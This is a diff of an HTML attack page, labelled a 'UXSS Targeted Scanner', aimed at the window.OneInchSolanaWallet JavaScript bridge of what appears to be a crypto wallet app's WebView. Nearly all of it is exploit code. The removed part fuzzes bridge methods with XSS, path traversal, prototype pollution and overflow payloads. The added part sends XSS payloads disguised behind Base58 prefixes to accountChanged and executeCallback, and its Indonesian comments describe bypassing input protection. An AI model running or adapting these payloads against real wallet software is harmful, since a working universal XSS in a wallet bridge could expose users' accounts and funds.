@@ -2,72 +2,50 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bridge Fuzzer - Security Research</title>
+    <title>UXSS Scanner V3</title>
 </head>
-<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center;">
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
 
-    <h2>DApp Bridge Fuzzer</h2>
-    <div style="border: 1px solid #0f0; padding: 15px; border-radius: 10px; background: #111;">
-        <button onclick="startFuzzing()" style="padding: 15px; background: #0f0; color: #000; font-weight: bold; border: none; width: 100%; cursor: pointer;">
-            START AUTOMATED FUZZING
-        </button>
-        <div id="log" style="text-align: left; margin-top: 20px; font-size: 10px; height: 300px; overflow-y: scroll; border-top: 1px solid #333; padding-top: 10px;">
-            > System ready. Waiting for command...
-        </div>
+    <h3>🚀 UXSS TARGETED SCANNER</h3>
+    <button onclick="runUXSS()" style="padding: 15px; background: #222; color: #0f0; border: 1px solid #0f0; width: 100%; cursor: pointer;">
+        START TARGETED ATTACK
+    </button>
+
+    <div id="status" style="margin-top: 20px; font-size: 11px; white-space: pre-wrap; border-top: 1px solid #333;">
+        Ready...
     </div>
 
     <script>
-    function log(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `<div>> ${msg}</div>`;
-        l.scrollTop = l.scrollHeight;
-    }
-
-    async function startFuzzing() {
+    function runUXSS() {
         const target = window.OneInchSolanaWallet;
-        if (!target) return alert("Target Bridge Not Found!");
+        const status = document.getElementById('status');
+        
+        if (!target) return alert("Bridge Not Found");
 
-        // Daftar Payload Kerentanan
-        const payloads = [
-            "<script>alert(document.domain)<\/script>", // Basic XSS
-            "javascript:alert(1)",                       // URI Injection
-            "{{7*7}}",                                   // Template Injection
-            "../../etc/passwd",                          // Path Traversal
-            "{\"__proto__\":{\"polluted\":\"true\"}}",   // Prototype Pollution
-            null,                                        // Type Confusion
-            undefined,                                   // Null Pointer
-            "A".repeat(1000000)                          // Buffer Overflow
+        // Payload yang dikamuflase (Base58 valid di depan, script di belakang)
+        const smartPayloads = [
+            "11111111111111111111111111111111<script>alert(1)<\/script>", 
+            "2xT8p8...';alert(document.domain);//",
+            "javascript:alert('UXSS')",
+            "<img src=x onerror=alert(8)>",
+            "{\"address\":\"1111...\", \"meta\":\"<svg/onload=alert(1)>\"}"
         ];
 
-        // Daftar Fungsi yang ditemukan di scan Anda
-        const methods = ['init', 'accountChanged', 'executeCallback', 'chainChanged'];
+        status.innerHTML = "Attacking accountChanged & executeCallback...\n";
 
-        log("Starting Fuzzing on " + methods.length + " methods...");
-
-        for (let method of methods) {
-            if (typeof target[method] === 'function') {
-                log(`Testing method: ${method}`);
+        smartPayloads.forEach(p => {
+            try {
+                // Mencoba bypass proteksi base58
+                target.accountChanged(p);
                 
-                for (let p of payloads) {
-                    try {
-                        log(`Sending payload to ${method}...`);
-                        // Mencoba mengeksekusi dengan payload berbeda
-                        target[method](p); 
-                        
-                        // Khusus executeCallback biasanya butuh lebih dari 1 argumen
-                        if (method === 'executeCallback') {
-                            target[method]("1", p, true);
-                        }
-                        
-                        // Jeda singkat agar WebView tidak langsung mati total
-                        await new Promise(r => setTimeout(r, 100)); 
-                    } catch(e) {
-                        log(`Notice: ${method} caught error: ${e.message}`);
-                    }
-                }
+                // Mencoba menyuntikkan callback (Ini jalur UXSS paling umum)
+                target.executeCallback("payload", p, true);
+                
+                status.innerHTML += `> Sent: ${p.substring(0,20)}...\n`;
+            } catch(e) {
+                status.innerHTML += `> Log: ${e.message}\n`;
             }
-        }
-        log("Fuzzing complete. Check for crashes or alerts.");
+        });
     }
     </script>
 </body>
